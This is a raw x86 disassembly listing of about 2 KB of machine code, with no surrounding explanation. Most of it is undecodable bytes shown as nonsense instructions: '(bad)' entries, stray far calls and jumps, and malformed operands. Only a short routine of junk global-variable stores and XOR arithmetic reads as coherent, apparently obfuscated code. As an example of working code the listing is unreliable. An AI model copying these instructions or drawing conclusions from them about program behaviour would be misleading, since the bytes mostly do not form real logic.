  406260:	push   0xffffff81
  406262:	inc    ebx
  406263:	hlt    
  406264:	jno    0x4062dd
  406266:	out    0xbb,ax
  406269:	ins    BYTE PTR es:[edi],dx
  40626a:	call   0xf095ddac
  40626f:	retf   
  406270:	enter  0x49b3,0x5
  406274:	(bad)  
  406275:	js     0x4062e2
  406277:	outs   dx,DWORD PTR ds:[esi]
  406278:	call   0xcdb7d5af
  40627d:	inc    esi
  40627e:	ja     0x4062a1
  406280:	ret    
  406281:	dec    ebx
  406282:	arpl   WORD PTR [ebx+0x4e],dx
  406285:	pop    ss
  406286:	jno    0x40624f
  406288:	iret   
  406289:	imul   eax,DWORD PTR [edx+0x12],0xffffffc6
  40628d:	ins    DWORD PTR es:[edi],dx
  40628e:	stc    
  40628f:	or     BYTE PTR [ecx+0x7a7abe88],al
  406295:	jle    0x4062e6
  406297:	(bad)  
  406298:	(bad)  
  406299:	out    dx,al
  40629a:	aam    0x39
  40629c:	xor    DWORD PTR [edi+0x52],ebx
  40629f:	les    ebp,FWORD PTR [edi]
  4062a1:	mov    ecx,0x5dc4d396
  4062a6:	jge    0x406314
  4062a8:	mov    esp,0xc92e7561
  4062ad:	aaa    
  4062ae:	ss pusha 
  4062b0:	pop    ss
  4062b1:	fadd   st(1),st
  4062b3:	mov    ebp,0xe1ea12b0
  4062b8:	call   0x3bc91e8c
  4062bd:	pop    ebp
  4062be:	lods   eax,DWORD PTR ds:[esi]
  4062bf:	outs   dx,DWORD PTR ds:[esi]
  4062c0:	scas   eax,DWORD PTR es:[edi]
  4062c1:	push   eax
  4062c2:	popf   
  4062c3:	push   edi
  4062c4:	mul    DWORD PTR [ebp+edx*1+0x3d]
  4062c8:	inc    BYTE PTR [eax+0x5ac5284f]
  4062ce:	int    0x1d
  4062d0:	call   0xda633c3a
  4062d5:	mov    esi,0xb29d6178
  4062da:	mov    eax,ds:0xee6f21f1
  4062df:	add    DWORD PTR ds:0xbd2f06b1,0x9
  4062e6:	and    BYTE PTR [edi-0xc],0xf9
  4062ea:	nop
  4062eb:	in     al,0xa5
  4062ed:	dec    ebx
  4062ee:	pop    edx
  4062ef:	dec    ecx
  4062f0:	fcom   DWORD PTR [esi]
  4062f2:	xchg   edi,eax
  4062f3:	stc    
  4062f4:	or     bh,ch
  4062f6:	cwde   
  4062f7:	test   al,0x70
  4062f9:	sub    ch,0x4b
  4062fc:	popf   
  4062fd:	cmp    dl,al
  4062ff:	xchg   esi,eax
  406300:	mov    bh,0x9
  406302:	in     al,dx
  406303:	pushf  
  406304:	mov    dh,0xc1
  406306:	(bad)  
  406307:	stc    
  406308:	dec    eax
  406309:	inc    ecx
  40630a:	push   0x7a540858
  40630f:	inc    edx
  406310:	(bad)  
  406311:	gs inc esp
  406313:	inc    eax
  406314:	pop    edx
  406315:	mov    edi,0x29ae1f0c
  40631a:	pop    ebx
  40631b:	push   esi
  40631c:	fdivp  st(2),st
  40631e:	add    eax,0xaffcb11
  406323:	je     0x406371
  406325:	xchg   ecx,eax
  406326:	fs stos DWORD PTR es:[edi],eax
  406328:	shl    DWORD PTR [ebx+0xe1ca162],1
  40632e:	leave  
  40632f:	jmp    0xfc0c157d
  406334:	jg     0x4063b1
  406336:	xor    eax,0x3ea0335c
  40633b:	psrad  mm1,QWORD PTR [ecx]
  40633e:	mov    ?,WORD PTR [edi+0x76]
  406341:	xchg   ebp,eax
  406342:	xchg   edx,eax
  406343:	add    BYTE PTR [ebx-0xb],dl
  406346:	cmp    eax,0xdebac6ae
  40634b:	mov    DWORD PTR [ebx],ebp
  40634d:	mov    cl,0x8c
  40634f:	pushf  
  406350:	cdq    
  406351:	das    
  406352:	mov    bh,0x3a
  406354:	push   ebp
  406355:	or     al,0x31
  406357:	lea    ecx,[ecx-0x3c]
  40635a:	lods   eax,DWORD PTR ds:[esi]
  40635b:	pushf  
  40635c:	jo     0x406379
  40635e:	dec    edi
  40635f:	pop    esi
  406360:	adc    BYTE PTR [ebp-0x7cc5bcba],bl
  406366:	(bad)  
  406368:	lds    esi,FWORD PTR [ecx+ebx*8]
  40636b:	xchg   ecx,eax
  40636c:	mov    ah,0x10
  40636e:	aam    0xec
  406370:	enter  0x5e93,0x36
  406374:	cmp    eax,0x94775d09
  406379:	(bad)  
  40637b:	popa   
  40637c:	(bad)  
  40637d:	adc    DWORD PTR [edx],ebx
  40637f:	pop    esp
  406380:	call   0xfb9:0x32e6dfd
  406387:	fnstenv [ebx]
  406389:	mov    ecx,DWORD PTR ds:0xacf5573e
  40638f:	pop    ebx
  406390:	fcos   
  406392:	out    dx,eax
  406393:	call   0x6d5c:0xd684e4fb
  40639a:	sbb    cl,0x64
  40639d:	bound  ebx,QWORD PTR [eax-0x13]
  4063a0:	jno    0x40641b
  4063a2:	cwde   
  4063a3:	shr    BYTE PTR [eax],0x3d
  4063a6:	(bad)  
  4063a7:	dec    edx
  4063a8:	mov    DWORD PTR [ebp-0x39e57a94],edi
  4063ae:	xor    eax,0xbe8c9ad
  4063b3:	inc    ebp
  4063b4:	or     al,dl
  4063b6:	dec    esi
  4063b7:	cdq    
  4063b8:	shl    DWORD PTR [eax-0x69],cl
  4063bb:	fwait
  4063bc:	cmpps  xmm6,XMMWORD PTR [edx+0x29fdc283],0x7e
  4063c4:	xor    ah,BYTE PTR [ecx-0x45f7769d]
  4063ca:	enter  0x634d,0xdf
  4063ce:	add    al,0x89
  4063d0:	mov    DWORD PTR [edx+0x764c0207],ebx
  4063d6:	push   esi
  4063d7:	push   0x44
  4063d9:	mov    eax,ds:0x9bec7579
  4063de:	fsubr  st,st(5)
  4063e0:	mov    WORD PTR [ebp+0x46b24890],?
  4063e6:	cmc    
  4063e7:	frstor [edi]
  4063e9:	jns    0x4063e1
  4063eb:	inc    edx
  4063ec:	push   ecx
  4063ed:	jmp    0x6397477d
  4063f2:	iret   
  4063f3:	outs   dx,BYTE PTR ds:[esi]
  4063f4:	mov    dh,0x54
  4063f6:	mov    eax,ds:0xbb5a63d
  4063fb:	inc    esi
  4063fc:	aad    0xa9
  4063fe:	push   edi
  4063ff:	lea    edx,[ebp-0x556d7648]
  406405:	cmp    ebx,DWORD PTR [ebx-0x4fce8241]
  40640b:	(bad)  
  40640c:	cmc    
  40640d:	data16 adc al,0x5c
  406410:	adc    al,0xe6
  406412:	pop    edx
  406413:	push   cs
  406414:	push   ecx
  406415:	adc    ebx,DWORD PTR [esi-0x66]
  406418:	mov    ah,0xf7
  40641a:	addr16 pop eax
  40641c:	inc    edi
  40641d:	adc    al,0x4f
  40641f:	xor    ah,al
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430506,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e7e2
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430512
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x430532,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee8c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e7e2,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e7da
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x65ceee46]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	pop    esp
  4064ae:	les    eax,FWORD PTR [ebx-0x2ad4f5e9]
  4064b4:	sub    ch,BYTE PTR [ecx*2+0x5f1dc53b]
  4064bb:	cdq    
  4064bc:	push   edi
  4064bd:	or     edx,esi
  4064bf:	sbb    eax,0xe6ebe0f6
  4064c4:	or     eax,DWORD PTR [ebx+0x2cbf47c0]
  4064ca:	pop    es
  4064cb:	into   
  4064cc:	push   esi
  4064cd:	popf   
  4064ce:	push   ebp
  4064cf:	mov    ecx,0xa733d3ca
  4064d4:	xchg   edx,eax
  4064d5:	mov    cl,0x1f
  4064d7:	loop   0x4064df
  4064d9:	mov    ah,0xcc
  4064db:	in     eax,0xee
  4064dd:	outs   dx,BYTE PTR ds:[esi]
  4064de:	repnz mov ah,0x79
  4064e1:	push   esp
  4064e2:	xchg   ebx,eax
  4064e3:	pop    ss
  4064e4:	int    0x4
  4064e6:	pop    ecx
  4064e7:	or     al,0xfc
  4064e9:	lahf   
  4064ea:	xor    al,0x74
  4064ec:	cmp    ah,BYTE PTR [ebp+0x1b]
  4064ef:	jae    0x406534
  4064f1:	popa   
  4064f2:	mov    ah,0xd7
  4064f4:	clc    
  4064f5:	shl    BYTE PTR [ebx+0x1916f508],1
  4064fb:	lahf   
  4064fc:	mov    DWORD PTR [ecx+0x5],ebx
  4064ff:	int    0x53
  406501:	stos   BYTE PTR es:[edi],al
  406502:	dec    esi
  406503:	pop    ecx
  406504:	shl    DWORD PTR [ebp-0x327ac74b],0x58
  40650b:	jb     0x406537
  40650d:	(bad)  
  40650e:	in     al,0x28
  406510:	div    DWORD PTR [edi+0x35]
  406513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406514:	mov    ecx,0xf679a7df
  406519:	ret    0x683b
  40651c:	sbb    DWORD PTR [esi+ecx*4],esp
  40651f:	adc    ebx,esi
  406521:	sub    DWORD PTR [bx-0x105d],edi
  406526:	mov    al,ds:0x7a390fd5
  40652b:	ss push edx
  40652d:	fst    DWORD PTR [ebp-0x9]
  406530:	fistp  DWORD PTR [ebx-0x5fe27d0d]
  406536:	fiadd  WORD PTR [edi+0x5be60a87]
  40653c:	in     al,dx
  40653d:	sub    BYTE PTR ds:0xab1845cc,ah
  406543:	sub    al,0xc6
  406545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406546:	mov    al,0xe0
  406548:	push   0xb2b0abb1
  40654d:	or     eax,0xb4de2923
  406552:	jnp    0x4065a9
  406554:	add    ebx,DWORD PTR [esi-0x1]
  406557:	fnsave [ecx-0x7a0d616f]
  40655d:	sbb    ecx,DWORD PTR ds:0x6ab8685
  406563:	inc    ebx
  406564:	loop   0x40656f
  406566:	cld    
  406567:	add    ecx,esi
  406569:	adc    eax,0x621e2fb
  40656e:	out    0x3a,eax
  406570:	sbb    al,BYTE PTR [ebp-0x2aaa838c]
  406576:	sbb    DWORD PTR [eax-0x1e6db0f6],esp
  40657c:	sti    
  40657d:	je     0x4064ff
  40657f:	into   
  406580:	fwait
  406581:	xchg   edi,eax
  406582:	fcomp  QWORD PTR [esi+0x1a]
  406585:	shl    BYTE PTR [ecx],0x5c
  406588:	outs   dx,BYTE PTR ds:[esi]
  40658a:	push   0x53a98f02
  40658f:	and    bh,ah
  406591:	mov    dl,al
  406593:	jo     0x406602
  406595:	stos   BYTE PTR es:[edi],al
  406596:	mov    edx,0xda963237
  40659b:	shl    BYTE PTR [eax+0x535b5144],cl
  4065a1:	imul   edx,DWORD PTR [edx],0x6061698
  4065a7:	sub    al,0xec
  4065a9:	fcomp  DWORD PTR [edi-0x53]
  4065ac:	neg    BYTE PTR [edx+0x13]
  4065af:	aaa    
  4065b0:	xchg   ecx,eax
  4065b1:	nop
  4065b2:	xchg   edx,eax
  4065b3:	outs   dx,DWORD PTR ds:[esi]
  4065b4:	gs pushf 
  4065b6:	stos   DWORD PTR es:[edi],eax
  4065b7:	fwait
  4065b8:	aas    
  4065b9:	aas    
  4065ba:	(bad)  
  4065bb:	fnstsw WORD PTR [edx+0x5f]
  4065be:	inc    edi
  4065bf:	ret    
  4065c0:	mov    al,0x2e
  4065c2:	inc    esi
  4065c3:	pushf  
  4065c4:	xchg   BYTE PTR [edi],bh
  4065c6:	xor    al,0xe
  4065c8:	sub    al,0xfa
  4065ca:	(bad)  
  4065cb:	mov    edi,0xe002a12a
  4065d0:	daa    
  4065d1:	jne    0x40655a
  4065d3:	mov    ch,BYTE PTR [ebp+eax*4-0x3a]
  4065d7:	rol    DWORD PTR ds:0xd486f12c,1
  4065dd:	cld    
  4065de:	nop    DWORD PTR [eax+ebx*8+0x21]
  4065e3:	push   esi
  4065e4:	jle    0x406619
  4065e6:	and    bh,bh
  4065e8:	mov    cl,0x33
  4065ea:	test   DWORD PTR [ebp+0xc],ebp
  4065ed:	clc    
  4065ee:	mov    ds,ecx
  4065f0:	or     al,0x58
  4065f2:	mov    bl,0xab
  4065f4:	cmc    
  4065f5:	and    dh,cl
  4065f7:	test   DWORD PTR [edi],ecx
  4065f9:	retf   0xc307
  4065fc:	add    BYTE PTR [ebp-0x75e3e3ad],bh
  406602:	push   ebx
  406603:	mov    ebp,0xb4cfa0a2
  406608:	pop    eax
  406609:	stc    
  40660a:	xchg   esi,eax
  40660b:	pand   mm4,QWORD PTR [esi]
  40660e:	mov    edi,DWORD PTR [edx]
  406610:	inc    esi
  406611:	imul   esp,esi,0x6f
  406614:	outs   dx,DWORD PTR ds:[esi]
  406615:	idiv   BYTE PTR [ebx-0x19a95ede]
  40661b:	fdiv   QWORD PTR ds:0xa4e6e9f5
  406621:	ret    0x921c
  406624:	je     0x406639
  406626:	aaa    
  406627:	pop    esp
  406628:	pop    edi
  406629:	inc    esi
  40662a:	mov    ds:0x10220bb0,al
  40662f:	fld    DWORD PTR [edx-0x16372e6e]
  406635:	dec    ecx
  406636:	addr16 icebp 
  406638:	or     eax,0xb16d5b3d
  40663d:	jmp    0x514b:0xfd14e643
  406644:	fiadd  DWORD PTR [bp+si]
  406647:	or     ecx,DWORD PTR [esi+0x71]
  40664a:	fwait
  40664b:	sub    esp,eax
  40664d:	pop    ebp
  40664e:	push   ecx
  40664f:	scas   al,BYTE PTR es:[edi]
  406650:	mov    esp,0xd930b4db
  406655:	jnp    0x406623
  406657:	and    BYTE PTR [eax-0x2e48e294],ch
  40665d:	cmp    cl,BYTE PTR [edx+0x46]
  406660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406661:	es xchg ebx,eax
  406663:	pop    ebx
  406664:	sub    DWORD PTR [ecx+0x2],ebp
  406667:	out    dx,eax
  406668:	(bad)  
  406669:	fwait
  40666a:	leave  
  40666b:	dec    eax
  40666c:	xchg   DWORD PTR [eax-0x3d],esp
  40666f:	(bad)  
  406670:	and    BYTE PTR [ebx],ch
  406672:	pop    edx
  406673:	scas   al,BYTE PTR es:[di]
  406675:	retf   
  406676:	fmul   QWORD PTR ds:0xe9932ead
  40667c:	push   ecx
  40667d:	lods   eax,DWORD PTR ds:[esi]
  40667e:	fadd   QWORD PTR [ebx-0x24]
  406681:	pop    ebx
  406682:	sub    DWORD PTR [esi+edi*8],0x56
  406686:	mov    esp,0x808bfc39
  40668b:	nop
  40668c:	pop    ds
  40668d:	stos   DWORD PTR es:[edi],eax
  40668e:	jle    0x4066eb
  406690:	imul   esp,DWORD PTR [ecx+ecx*4+0xd],0xfd8678da
  406698:	sahf   
  406699:	push   eax
  40669a:	jge    0x4066fa
  40669c:	or     DWORD PTR [esi+ebp*2-0x59],0x10
  4066a1:	mov    bh,0x48
  4066a3:	not    DWORD PTR [eax+0x332168f5]
  4066a9:	jg     0x40670a
  4066ab:	push   0x27
  4066ad:	rcl    ecx,0x16
  4066b0:	in     al,dx
  4066b1:	ja     0x406645
  4066b3:	shr    BYTE PTR [edi+0x13c198fc],0xb8
  4066ba:	mov    ah,ch
  4066bc:	cdq    
  4066bd:	cmp    edi,DWORD PTR [ebx-0xc23a08b]
  4066c3:	call   0x22c7:0x6ff01a50
  4066ca:	jmp    0xa170:0xc6673c7b
  4066d1:	sub    BYTE PTR [eax+0x7d],0xba
  4066d5:	pop    edi
  4066d6:	fcmovbe st,st(4)
  4066d8:	push   esi
  4066d9:	hlt    
  4066da:	retf   0x2af3
  4066dd:	push   cs
  4066de:	stc    
  4066df:	xchg   edi,eax
  4066e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e1:	cmp    eax,DWORD PTR [ebp-0x22]
  4066e4:	ds mov es:0x596b17ad,al
  4066eb:	jb     0x406686
  4066ed:	lea    edi,[eax+0x25249131]
  4066f3:	std    
  4066f4:	idiv   BYTE PTR [ecx]
  4066f6:	fistp  DWORD PTR [eax+0x16bafcf0]
  4066fc:	jb     0x406725
  4066fe:	push   ebp
  4066ff:	push   edi
  406700:	cdq    
  406701:	jmp    0xe5d4:0xa5b4041c
  406708:	jno    0x406693
  40670a:	push   esi
  40670b:	retf   
  40670c:	adc    BYTE PTR [ebp+esi*1-0x68],bl
  406710:	fsub   DWORD PTR [edx+0x65]
  406713:	cmc    
  406714:	enter  0x8d55,0x5b
  406718:	cwde   
  406719:	jge    0x406769
  40671b:	rcl    ch,1
  40671d:	retf   
  40671e:	sbb    BYTE PTR [ebx+0x299fd84f],cl
  406724:	jmp    0x4066f3
  406726:	inc    eax
  406727:	sbb    eax,0x648d2ce9
  40672c:	sub    al,0x19
  40672e:	adc    BYTE PTR [eax-0x6e],0xad
  406732:	idiv   BYTE PTR [ebx-0x4c01790]
  406738:	dec    ebp
  406739:	jge    0x4066f5
  40673b:	in     eax,dx
  40673c:	cdq    
  40673d:	clc    
  40673e:	arpl   WORD PTR [edx],bx
  406740:	lea    esp,[ebx+0x72b28ccd]
  406746:	into   
  406747:	int3   
  406748:	add    eax,0x1f7e89ab
  40674d:	xor    al,0x71
  40674f:	pop    edx
  406750:	ffreep st(7)
  406752:	cmp    DWORD PTR [ecx+0x37],0xedf99710
  406759:	jbe    0x4067c0
  40675b:	mov    ds:0x5c5662b1,eax
  406760:	shl    DWORD PTR [edx-0x439d4899],1
  406766:	ret    0xb7a
  406769:	aad    0x7c
  40676b:	xlat   BYTE PTR ds:[ebx]
  40676c:	retf   0xe75a
  40676f:	aam    0x0
  406771:	ins    DWORD PTR es:[edi],dx
  406772:	jg     0x406780
  406774:	ins    BYTE PTR es:[edi],dx
  406775:	xor    edx,DWORD PTR [eax]
  406777:	xchg   BYTE PTR [eax],bh
  406779:	xchg   edi,eax
  40677a:	sub    BYTE PTR [ebx-0x80],cl
  40677d:	cli    
  40677e:	mov    al,0xad
  406780:	push   ss
  406781:	xchg   edi,eax
  406782:	and    al,0xc9
  406784:	lea    edx,[eax]
  406786:	xlat   BYTE PTR ds:[ebx]
  406787:	addr16 xchg edx,eax
  406789:	mov    ebx,0x6ebc8586
  40678e:	(bad)  
  40678f:	jecxz  0x4067d2
  406791:	pop    edx
  406792:	adc    bh,BYTE PTR [edi+0x427c4564]
  406798:	mov    edx,0x6e07e487
  40679d:	aad    0x55
  40679f:	imul   esi,DWORD PTR [ebp+0x3513ed28],0xffffff83
  4067a6:	adc    eax,0xa0373b7f
  4067ab:	or     edi,ebp
  4067ad:	leave  
  4067ae:	repnz xchg ecx,eax
  4067b0:	xchg   esi,eax
  4067b1:	repnz les esi,FWORD PTR [eax]
  4067b4:	cmp    al,0x30
  4067b6:	pop    es
  4067b7:	xor    BYTE PTR [edi],al
  4067b9:	scas   eax,DWORD PTR es:[edi]
  4067ba:	mov    ds:0xc899cd14,eax
  4067bf:	out    dx,eax
  4067c0:	pop    ds
  4067c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c2:	mov    dl,0xdd
  4067c4:	cmp    esp,DWORD PTR [ecx-0x7eeb94d8]
  4067ca:	repz hlt 
  4067cc:	inc    edi
  4067cd:	aad    0x7c
  4067cf:	xlat   BYTE PTR ds:[ebx]
  4067d0:	loop   0x40680b
  4067d2:	sahf   
  4067d3:	xchg   ebx,eax
  4067d4:	lock push eax
  4067d6:	mov    ch,BYTE PTR [edi]
  4067d8:	fdivr  DWORD PTR [eax+0x52e6144c]
  4067de:	(bad)  
  4067df:	sbb    eax,0x9bf30bc4
  4067e4:	mov    al,ds:0xb5594bf2
  4067e9:	aas    
  4067ea:	cli    
  4067eb:	icebp  
  4067ec:	sub    BYTE PTR [eax+edx*4+0x26],cl
  4067f0:	lods   eax,DWORD PTR ds:[esi]
  4067f1:	imul   esi,DWORD PTR [edx],0xffffffb5
  4067f4:	push   es
  4067f5:	bound  edi,QWORD PTR [edx+0xe]
  4067f8:	bound  esp,QWORD PTR [esi]
  4067fa:	xor    dl,BYTE PTR [eax+ebx*8]
  4067fd:	ins    DWORD PTR es:[edi],dx
  4067fe:	cmp    eax,0x67f4f614
  406803:	pop    eax
  406804:	push   0xffffffa6
  406806:	js     0x406808
  406808:	jno    0x406875
  40680a:	lahf   
  40680b:	fisub  DWORD PTR [edx]
  40680d:	aaa    
  40680e:	hlt    
  40680f:	imul   esp,DWORD PTR [edi+0x33a19969],0xffffff8f
  406816:	repz mov al,0xb1
  406819:	xchg   ebx,eax
  40681a:	mov    esi,DWORD PTR [ebp+0xc]
  40681d:	sbb    DWORD PTR ds:0x42eea4,0x43052a
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x4305d2,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee9c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x4305be
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x43053a,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x4305d6,0x43051a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42eea4,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	jmp    0x7e36:0x4b90f0fb
  40689a:	jle    0x406887
  40689c:	jno    0x40691c
  40689e:	jle    0x4068c0
  4068a0:	jg     0x406909
  4068a2:	pop    ecx
  4068a3:	imul   eax,DWORD PTR [eax+eiz*2],0xbf3cf475
  4068aa:	and    BYTE PTR [eax+0x2],dl
  4068ad:	push   ebx
  4068ae:	rol    ecx,0x5d
  4068b1:	sub    eax,0xdc12ca66
  4068b6:	aam    0x36
  4068b8:	fsubp  st(1),st
  4068ba:	mov    al,ds:0x3ff57b3e
  4068bf:	sti    
  4068c0:	ins    BYTE PTR es:[edi],dx
  4068c1:	(bad)  
  4068c2:	adc    ecx,eax
  4068c4:	lods   eax,DWORD PTR ds:[esi]
  4068c5:	cmc    
  4068c6:	lahf   
  4068c7:	in     eax,0x58
  4068c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ca:	xchg   ecx,eax
  4068cb:	imul   edi,DWORD PTR [esi+0x6273ecec],0x52
  4068d2:	or     eax,DWORD PTR [edi-0x15770cb5]
  4068d8:	imul   ebx,DWORD PTR [edi],0x76
  4068db:	and    BYTE PTR [edx+0x6bc7b22e],cl
  4068e1:	aad    0xec
  4068e3:	imul   edi,edx,0x66
  4068e6:	repz xor DWORD PTR [ebp-0x32],esi
  4068ea:	stos   DWORD PTR es:[edi],eax
  4068eb:	(bad)  
  4068ec:	dec    ebp
  4068ed:	mov    ds:0x2ce3ba29,eax
  4068f2:	push   esp
  4068f3:	cmp    cl,BYTE PTR [eax]
  4068f5:	dec    esi
  4068f6:	scas   eax,DWORD PTR es:[edi]
  4068f7:	and    DWORD PTR [esi+0x2a323bd3],ecx
  4068fd:	mov    bl,0x9d
  4068ff:	es dec ecx
  406901:	int3   
  406902:	xchg   BYTE PTR [eax+eax*1+0x5502fdb7],dh
  406909:	clc    
  40690a:	mov    ds:0xe30dedb6,eax
  40690f:	pop    eax
  406910:	inc    ecx
  406911:	push   0x94c4101c
  406916:	(bad)  
  406918:	sahf   
  406919:	(bad)  
  40691b:	adc    al,BYTE PTR [edi+0xc]
  40691e:	imul   ecx,ebp,0xffffffbd
  406921:	loop   0x4068f1
  406923:	fadd   st,st(7)
  406925:	retf   0x3bd4
  406928:	or     al,0xc3
  40692a:	push   0x31
  40692c:	inc    ebp
  40692d:	adc    ecx,DWORD PTR [ecx-0x47]
  406930:	cs popa 
  406932:	add    eax,0x742f4ef0
  406937:	mov    dh,0x96
  406939:	mov    bh,BYTE PTR [ebx-0x8]
  40693c:	lods   al,BYTE PTR ds:[esi]
  40693d:	outs   dx,DWORD PTR ds:[esi]
  40693e:	popf   
  40693f:	sbb    DWORD PTR [ecx-0x59],eax
  406942:	sti    
  406943:	and    edx,ebx
  406945:	data16 je 0x406920
  406948:	mov    ds:0x8bc74976,eax
  40694d:	mov    dl,0x46
  40694f:	cmp    ebx,DWORD PTR [ebp-0x23647479]
  406955:	push   esp
  406956:	sub    BYTE PTR [ebp+eiz*8-0x7ee5ba45],al
  40695d:	xchg   ecx,eax
  40695e:	rcl    DWORD PTR [ebx+eax*2+0x61],1
  406962:	push   ds
  406963:	out    dx,al
  406964:	mov    edi,0x49beab7a
  406969:	add    al,0xf7
  40696b:	fs das 
  40696d:	sub    edi,DWORD PTR [edx+0x20970b9a]
  406973:	shl    DWORD PTR [ebp+0x2c],1
  406976:	xor    al,BYTE PTR [ebx+0x766131a8]
  40697c:	arpl   WORD PTR [ecx-0x1],dx
  40697f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406980:	lock or DWORD PTR gs:[ebp-0x1],0x6f
  406986:	push   eax
  406987:	mov    esi,DWORD PTR [edi-0x29]
  40698a:	(bad)  
  40698b:	fnstcw WORD PTR [edi-0x7b09f8cd]
  406991:	mov    al,ds:0x91451ed3
  406996:	sbb    al,0xf2
  406998:	fs or  al,0x1
  40699b:	mov    esi,DWORD PTR [ebp-0x4df0193]
  4069a1:	loope  0x4069d7
  4069a3:	test   DWORD PTR [eax-0x4d],edx
  4069a6:	mov    ebx,0x50db8e82
  4069ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ac:	imul   ecx,DWORD PTR [ecx-0x46a21bcd],0xafe8704e
  4069b6:	sub    eax,0x2958c4e7
  4069bb:	xor    bh,BYTE PTR [eax]
  4069bd:	dec    ebx
  4069be:	dec    eax
  4069bf:	cmp    DWORD PTR [esi],ebx
  4069c1:	xor    eax,0x7928ef5d
  4069c6:	lds    esp,FWORD PTR [edi+0x1a]
  4069c9:	mov    esi,DWORD PTR [esi]
  4069cb:	lds    esi,FWORD PTR ds:0x815eac2e
  4069d1:	pop    esp
  4069d2:	cmp    DWORD PTR [esi+0x48bc3d3],0x5d2b915d
  4069dc:	add    al,0xa6
  4069de:	mov    ch,0x5a
  4069e0:	sub    al,0x3d
  4069e2:	ins    BYTE PTR es:[edi],dx
  4069e3:	out    dx,eax
  4069e4:	and    edi,esp
  4069e6:	loopne 0x406a53
  4069e8:	inc    edx
  4069e9:	loope  0x40697d
  4069eb:	jae    0x4069f8
  4069ed:	push   eax
  4069ee:	dec    ebx
  4069ef:	leave  
  4069f0:	mov    dh,0x4e
  4069f2:	push   eax
  4069f3:	icebp  
  4069f4:	in     eax,dx
  4069f5:	lock pop edi
  4069f7:	push   0x69
  4069f9:	mov    bl,0x5b
  4069fb:	sub    ebp,esi
  4069fd:	push   ebp
  4069fe:	push   fs
  406a00:	fcom   QWORD PTR [ebx]
  406a02:	sahf   
  406a03:	sahf   
  406a04:	or     BYTE PTR [esi-0x367c2aba],bh
  406a0a:	aad    0x9c
  406a0c:	mov    al,ds:0xac79cd19
  406a11:	in     eax,0x4b
  406a13:	test   DWORD PTR [ebx+eiz*4+0x16654bef],ebp
  406a1a:	xor    dl,BYTE PTR [eax+0x2927b215]
  406a20:	loope  0x4069c6
  406a22:	mov    ebp,0xa08017d3
  406a27:	lahf   
  406a28:	leave  
  406a29:	adc    cl,al
  406a2b:	int3   
  406a2c:	lods   eax,DWORD PTR ds:[esi]
  406a2d:	mov    ?,eax
  406a2f:	sar    BYTE PTR [ebx-0x6ff27bce],1
  406a35:	retf   
  406a36:	rcl    BYTE PTR [eax],0xa6
  406a39:	adc    al,0x55
  406a3b:	cmp    edx,DWORD PTR [edx+0x78310ce7]
  406a41:	cli    
  406a42:	inc    eax
  406a43:	retf   
  406a44:	dec    eax
  406a45:	or     esi,ebp
  406a47:	(bad)  
  406a48:	sub    esp,DWORD PTR [edx-0x2b868088]
  406a4e:	cmp    BYTE PTR [ebx*2+0x2b3dd3f],dl
  406a55:	scas   eax,DWORD PTR es:[edi]
  406a56:	cmp    esp,DWORD PTR [edx+0x12]
  406a59:	rcl    DWORD PTR [edi-0x9dbad68],0xa4
  406a60:	jo     0x406a45
  406a62:	cld    
  406a63:	adc    BYTE PTR [esi+0x5f],dh
  406a66:	inc    ebp
  406a67:	dec    eax
  406a68:	cld    
  406a69:	mul    DWORD PTR [ebx+0x49]
  406a6c:	test   al,0xe0
  406a6e:	scas   al,BYTE PTR es:[edi]
  406a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a70:	mov    dl,bl
  406a72:	adc    eax,0x60600f06
  406a77:	inc    eax
  406a78:	pop    ebp
  406a79:	fsub   QWORD PTR [edi]
  406a7b:	test   eax,0x2974b5c5
  406a80:	lea    edi,[edi-0x3d0c371b]
  406a86:	fdivr  QWORD PTR [edx]
  406a88:	iret   
  406a89:	dec    edi
  406a8a:	lock and cl,ch
  406a8d:	ja     0x406a48
  406a8f:	pop    ebx
